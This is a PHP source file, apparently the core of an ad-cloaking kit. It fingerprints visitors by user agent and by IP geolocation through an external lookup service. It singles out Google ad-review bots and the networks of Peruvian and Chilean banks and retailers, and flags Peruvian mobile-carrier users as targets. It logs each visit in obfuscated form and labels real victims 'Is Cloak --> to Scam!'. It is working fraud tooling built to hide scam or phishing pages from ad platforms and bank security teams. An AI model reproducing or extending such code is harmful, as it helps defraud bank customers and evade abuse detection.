<?php
class AdsJerts {
	
	
function cUrl( $url, $timeout=3, $error_report=TRUE){
	
    $curl = curl_init();

    // HEADERS AND OPTIONS APPEAR TO BE A FIREFOX BROWSER REFERRED BY GOOGLE
    $header[] = "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
    $header[] = "Cache-Control: max-age=0";
    $header[] = "Connection: keep-alive";
    $header[] = "Keep-Alive: 300";
    $header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $header[] = "Accept-Language: en-us,en;q=0.5";
    $header[] = "Pragma: "; // BROWSERS USUALLY LEAVE BLANK

    // SET THE CURL OPTIONS - SEE http://php.net/manual/en/function.curl-setopt.php
    curl_setopt( $curl, CURLOPT_URL,            $url  );
    curl_setopt( $curl, CURLOPT_USERAGENT,      'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'  );
    curl_setopt( $curl, CURLOPT_HTTPHEADER,     $header  );
    curl_setopt( $curl, CURLOPT_REFERER,        'http://www.google.com'  );
    curl_setopt( $curl, CURLOPT_ENCODING,       'gzip,deflate'  );
    curl_setopt( $curl, CURLOPT_AUTOREFERER,    TRUE  );
    curl_setopt( $curl, CURLOPT_RETURNTRANSFER, TRUE  );
    curl_setopt( $curl, CURLOPT_FOLLOWLOCATION, TRUE  );
    curl_setopt( $curl, CURLOPT_TIMEOUT,        $timeout  );

    // RUN THE CURL REQUEST AND GET THE RESULTS
    $htm = curl_exec($curl);

    // ON FAILURE HANDLE ERROR MESSAGE
    if ($htm === FALSE)
    {
        if ($error_report)
        {
            $err = curl_errno($curl);
            $inf = curl_getinfo($curl);
			//
            //echo "CURL FAIL: $url TIMEOUT=$timeout, CURL_ERRNO=$err";
            //var_dump($inf);
        }
        curl_close($curl);
        return FALSE;
    }

    // ON SUCCESS RETURN XML / HTML STRING
    curl_close($curl);
    return $htm;
}		
function OsBrow() { 

    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
	$browser        =   "Unknown Browser";
    $os_array       =   array(
                            '/windows nt 10/i'      =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
							'/Google-Adwords-Instant/i'         =>  'Google Adwords',
                            '/webos/i'              =>  'Mobile',
							'/facebookexternalhit/i'              =>  'Facebook OS'
                        );
						
	$browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/www.google.com/i'  =>  'Web 2.0',
                            '/mobile/i'     =>  'Handheld Browser',
							'/facebookexternalhit/i'     =>  'Fb ExternalHit'
                        );					

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    } 
	foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    } 

    return $os_platform.' / '.$browser;

}
function GeraHash($qtd){

            $Caracteres = 'abcdefghijklnopqrstuvwz';
           $QuantidadeCaracteres = strlen($Caracteres);
           $QuantidadeCaracteres--;

           $Hash=NULL;
               for($x=1;$x<=$qtd;$x++){
                   $Posicao = rand(0,$QuantidadeCaracteres);
                   $Hash .= substr($Caracteres,$Posicao,1);
               }

           return $Hash;
         } 
function getBot() { 

    $user_agent        =   $_SERVER['HTTP_USER_AGENT'];
    $url               =   "http://extreme-ip-lookup.com/json/".$this->getClientIP();
	//$url               =   "http://extreme-ip-lookup.com/json/";
    $query             =   json_decode($this->cUrl($url));
    $bot_agent         =   "nobot";
	$red_agent         =   "nored";
    $agent_array       =   array(
                            '/Googlebot/i'                            =>  'Googlebot',
                            '/Google Desktop/i'                       =>  'Google Desktop',
                            '/Google Favicon/i'                       =>  'Google Favicon',
                            '/Googlebot-Image/i'                      =>  'Googlebot Image',
                            '/googleweblight/i'                       =>  'Google Web Light',
                            '/AdsBot-Google-Mobile/i'                 =>  'AdsBot Google Mobile',
                            '/AdsBot-Google/i'                        =>  'AdsBot Google',
                            '/Google Page Speed Insights/i'           =>  'Google Page Speed Insights',
                            '/Google-Site-Verification/i'             =>  'Google Site Verification',
                            '/developers.google/i'                    =>  'Googlebot Snippet',
                            '/Google-SearchByImage/i'                 =>  'Google SearchByImage',
							'/Googlebot-Video/i'                      =>  'Googlebot Video',
							'/Google-Adwords-Instant/i'               =>  'Google Adwords Instant',
							'/Google-AdWords-Express/i'               =>  'Google AdWords Express',
							'/Google Keyword Suggestion/i'            =>  'Google Keyword Suggestion',
							'/Google-Adwords-DisplayAds-WebRender/i'  =>  'Google Adwords DisplayAds WebRender',
							'/Googlebot-Mobile/i'                     =>  'Googlebot Mobile',
                            '/Mediapartners-Google/i'                 =>  'Mediapartners Google'
							);	
							
    $ipslist_array  =   array(
                            '/Google/i'       =>  'Google',
                            '/Googlebot/i'    =>  'Google Bot',
                            '/Microsoft Corporation/i'     =>  'Microsoft Corporation',
							'/Microsoft bingbot/i'     =>  'Microsoft Bing Bot',
							'/Optical Technologies/i'     =>  'Peru Google Bot',
							'/Banco de Credito del peru/i'     =>  'Peru ViaBCP Bot',
							'/Banco de Credito/i'     =>  'Peru ViaBCP Bot',
							'/Red Cientifica Peruana/i'     =>  'Peru Google Bot',
							'/Optical Networks - Servicios/i'     =>  'Peru Google Bot',
							'/Banco SantanderSantiago/i'     =>  'Chile Santander Bot',
							'/Saga Falabella S.A./i'     =>  'Peru SagaFalabella Bot',
							'/Universidad de Chile/i'     =>  'Chile Google Bot',
                            '/DomainTools/i'     =>  'DomainTools',
                            '/server4you/i'       =>  'Server 4 You',
							);		
							
	$rediplist_array  =   array(
                            '/Viettel Peru S.A.C./i'       =>  'Bitel Peru',
                            '/VIETTEL PERÚ S.A.C/i'    =>  'Bitel Peru',
                            '/Entel Peru S.A./i'     =>  'Entel Peru',
							'/Telefonica del Peru/i'     =>  'Movistar Peru',
							'/America Movil Peru/i'     =>  'Claro Peru',
							);		

    foreach ($agent_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $bot_agent    =   $value;
        }

    }
	foreach ($rediplist_array as $regex => $value) { 

        if (preg_match($regex, $query->isp)) {
            $red_agent    =   $value;
        }

    }
	foreach ($rediplist_array as $regex => $value) { 

        if (preg_match($regex, $query->org)) {
            $red_agent    =   $value;
        }

    }
	foreach ($ipslist_array as $regex => $value) { 

        if (preg_match($regex, $query->isp)) {
            $bot_agent    =   $value;
        }

    }
	foreach ($ipslist_array as $regex => $value) { 

        if (preg_match($regex, $query->org)) {
            $bot_agent    =   $value;
        }

    }  
	if($query && $query->status == 'success') {
                $CountryCode = $query->countryCode;
         } else {
			 
		        $CountryCode = "NULL";
       }
	if($query && $query->status == 'success') {
                $CountryISP = $query->isp;
         } else {
                $CountryISP = "NULL";
       }
	 if($query && $query->status == 'success') {
                $Country = $query->country;
         } else {

		        $Country = "NULL";
       }
	 if($query && $query->status == 'success') {
                $CountryAS = $query->org;
         } else {
                $CountryAS = "NULL";
       }
	 if($query && $query->status == 'success') {
                $CountryIP = $query->query;
         } else {

                $CountryIP = $this->getClientIP();
                if($CountryIP == ""){
                    $CountryIP = "NULL";
                } else {
                    $CountryIP = $this->getClientIP();
                }
       }


	return array(
        'isbot'     => $bot_agent,
		'isRed'     => $bot_agent,
        'isCode'      => $CountryCode,
        'isISP'   => $CountryISP,
		'isTIPE'   => $CountryAS,
		'isIP'   => $CountryIP,
        'isCountry'  => $Country
          );

   }
  function getClientIP(){
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
           }
        }
     }
	function IpBanList($range = array(), $ip = '')
         {
        $ip = $this->longip(trim($ip));
        if($ip == FALSE)
        {
                return FALSE;
        }
        if(empty($ip))
        {
                return FALSE;
        }
        foreach($range AS $key => $val)
        {
                $temp = explode('-', $val);
                if(empty($temp[0]))
                {
                        return FALSE;
                }
                else
                {
                        $start_ip = $this->longip(trim($temp[0]));
                        if($start_ip == FALSE)
                        {
                                return FALSE;
                        }
                }
                if(empty($temp[1]))
                {
                        if($ip == $start_ip)
                        {
                                return TRUE;
                        }
                }
                else
                {
                        $stop_ip = $this->longip(trim($temp[1]));
                        if($stop_ip == FALSE)
                        {
                                return FALSE;
                        }
                }
                if($start_ip <= $ip && $ip <= $stop_ip)
                {
                        return TRUE;
                }
        }
        return FALSE;
      }
   function longip($ip)
        {
        if(empty($ip))
        {
                return FALSE;
        }
        $block = explode('.', $ip);
        if(count($block) != 4)
        {
                return FALSE;
        }
        $i = 3;
        $block_ip = 0;
        foreach($block as $k => $v)
        {
                $v = filter_var($v, FILTER_VALIDATE_INT);
                if($v < 0)
                {
                        $v = 0;
                }
                if($v > 255)
                {
                        $v = 255;
                }
                $block_ip += pow(256, $i)*$v;
                $i--;
        }
        return $block_ip;
    }
	function Desofuscar($string, $key) {
		$result = '';
		$string = base64_decode($string);
		for($i=0; $i<strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key))-1, 1);
			$char = chr(ord($char)-ord($keychar));

			$result.=$char;
		}
		return $result;
	}
    function Ofuscar($string, $key) {
		$result = '';
		for($i=0; $i<strlen($string); $i++) {
			$char = substr($string, $i, 1);
			$keychar = substr($key, ($i % strlen($key))-1, 1);
			$char = chr(ord($char)+ord($keychar));
			$result.=$char;
		}
		return base64_encode($result);
	}
	function OpenFile($FileName){
		
        if (file_exists($FileName)){
             $file_size = filesize($FileName);
        if ($file_size == 0) return "";
		} else return "-1";

        if (!$fp = fopen($FileName, "r")) return "-1";
            $s01 = fread($fp, filesize($FileName));
                   fclose($fp);
            return $s01;
        }
	
	function SaveFile($txt,$datos){
		if(!is_writable($txt)){
			return false;
		}
		$da =file_get_contents($txt);
		$gestor = fopen($txt, 'w+');
		if (!@fwrite($gestor, $datos.$da)) {
			return false;
		}
		fclose($gestor);
		return true;
	}
 function savelogs($ref,$pais,$perfect){
      $chek = $this->getBot();
      if($chek['isbot'] != "nobot" && $pais == $chek['isCode']){
          $sNbot  = "Bot! (".$chek['isbot'].") *cloak (Alert!)";
          $color  = "990000";
      }
      if($chek['isbot'] != "nobot" && $pais != $chek['isCode']){
          $sNbot  = "Review -->Bot! (".$chek['isbot'].")"; 
          $color  = "FF0000";
      }
      if($chek['isbot'] == "nobot"){
          $sNbot  = "Review -->" .$chek['isCode']. "";
          $color  = "666666";
      }
      if($perfect == true){
          $sNbot  = 'Is Cloak --> to Scam!';
          $color  = "009933";
      }
      if(isset($_REQUEST["keyword"])){
          $keyword = $_REQUEST["keyword"];
      } else {
          $keyword = "none";
      }
      
     $registros = '<tr><td><font size="1" color="#'.$color.'">' .date("d/m/Y g:i a"). '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$chek['isIP']. '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$sNbot. '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$keyword. '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$chek['isISP']. ' (' .$chek['isTIPE']. ')</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$chek['isCountry'].'</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$this->OsBrow(). '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .$ref. '</font></td>'.
                  '<td><font size="1" color="#'.$color.'">' .uniqid(). '</font></td></tr>';
                  $this->SaveFile('data/ads_logs.pj',$this->Ofuscar($registros,'EC?F6/X4-F65*5').'|');
  }
   function referer($urls){
	          $url = $urls;
               $protocolos = array('http://', 'https://', 'ftp://', 'www.');
                  $url = explode('/', str_replace($protocolos, '', $url));
	                 $nombre  = $url[0];
                  return $nombre;
   }
   function timecrack($sgt){
	   $utchora = "Select Time!";
	   $utm_array  =   array(
                            '/00/i'     =>  '12:00AM',
                            '/01/i'     =>  '01:00AM',
                            '/02/i'     =>  '02:00AM',
							'/03/i'     =>  '03:00AM',
							'/04/i'     =>  '04:00AM',
							'/05/i'     =>  '05:00AM',
							'/06/i'     =>  '06:00AM',
							'/07/i'     =>  '07:00AM',
							'/08/i'     =>  '08:00AM',
							'/09/i'     =>  '09:00AM',
                            '/10/i'     =>  '10:00AM',
                            '/11/i'     =>  '11:00AM',
							'/12/i'     =>  '12:00PM',
							'/13/i'     =>  '01:00PM',
							'/14/i'     =>  '02:00PM',
							'/15/i'     =>  '03:00PM',
							'/16/i'     =>  '04:00PM',
							'/17/i'     =>  '05:00PM',
							'/18/i'     =>  '06:00PM',
							'/19/i'     =>  '07:00PM',
							'/20/i'     =>  '08:00PM',
							'/21/i'     =>  '09:00PM',
							'/22/i'     =>  '10:00PM',
							'/23/i'     =>  '11:00PM',
							);
	   foreach ($utm_array as $regex => $value) { 

        if (preg_match($regex, $sgt)) {
            $utchora    =   $value;
          }

       }
    return $utchora;
   }

// end principal
}
?>